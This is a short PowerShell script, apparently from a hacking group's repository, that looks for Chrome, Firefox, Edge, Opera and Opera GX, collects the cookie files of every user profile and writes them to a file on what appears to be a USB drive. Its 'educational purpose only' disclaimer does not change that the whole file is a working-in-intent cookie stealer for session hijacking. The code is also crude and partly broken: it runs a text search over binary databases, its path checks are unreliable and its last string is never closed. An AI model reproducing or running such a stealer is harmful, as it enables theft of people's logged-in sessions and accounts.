# Developer: SirCryptic (NullSecurityTeam)
# Info: This is for educational purpose only attacking target/s without prior/mutual consent can lead to imprisonment.

# Browser Check's
# Check if Chrome is installed
$chromeInstalled = (Get-Command "chrome.exe" -ErrorAction SilentlyContinue) -ne $null
if ($chromeInstalled) {
    $chromePath = "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Cookies"
    $chromeCookies = (Get-ChildItem -Path $chromePath -Recurse | Select-String 'http')
    $cookies += $chromeCookies
}

# Check if Firefox is installed
$firefoxInstalled = (Get-Command "firefox.exe" -ErrorAction SilentlyContinue) -ne $null
if ($firefoxInstalled) {
    $firefoxPath = "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"
    $firefoxCookies = (Get-ChildItem -Path $firefoxPath -Recurse | Select-String 'http')
    $cookies += $firefoxCookies
}

# Check if Edge is installed
$edgeInstalled = (Get-Command "msedge.exe" -ErrorAction SilentlyContinue) -ne $null
if ($edgeInstalled) {
    $edgePath = "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
    $edgeCookies = (Get-ChildItem -Path $edgePath -Recurse | Select-String 'http')
    $cookies += $edgeCookies
}

# Check if Opera is installed
$operaInstalled = (Get-Command "opera.exe" -ErrorAction SilentlyContinue) -ne $null
if ($operaInstalled) {
    $operaPath = "C:\Users\*\AppData\Roaming\Opera Software\Opera Stable\Cookies"
    $operaCookies = (Get-ChildItem -Path $operaPath -Recurse | Select-String 'http')
    $cookies += $operaCookies
}

# Check if Opera GX is installed
$operaGxInstalled = (Get-Command "opera-gx.exe" -ErrorAction SilentlyContinue) -ne $null
if ($operaGxInstalled) {
    $operaGxPath = "C:\Users\*\AppData\Roaming\Opera GX\Cookies"
    $operaGxCookies = (Get-ChildItem -Path $operaGxPath -Recurse | Select-String 'http')
    $cookies += $operaGxCookies
}

# Save all cookies to a USB drive
$cookies | Out-File "E:\cookies.txt
